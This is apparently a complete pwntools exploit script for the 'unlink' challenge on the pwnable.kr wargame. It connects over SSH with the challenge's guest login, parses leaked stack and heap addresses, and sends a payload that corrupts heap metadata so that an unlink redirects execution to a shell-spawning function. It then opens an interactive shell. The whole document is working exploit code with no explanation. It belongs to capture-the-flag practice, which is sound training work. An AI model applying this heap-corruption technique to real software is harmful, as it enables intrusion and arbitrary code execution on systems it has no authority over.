from pwn import *

con = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
p = con.process('./unlink')
p.recvuntil(': ')
stack = int(p.recvline()[2:], 16)

p.recvuntil(': ')
heap = int(p.recvline()[2:], 16)

print("STACK: ", hex(stack), " HEAP: ", hex(heap))

custom = stack + 0x10
heap += 0xc
shell = 0x080484eb

p.send(p32(shell) + "AAAABBBBCCCC" + p32(heap) + p32(custom))
p.interactive()
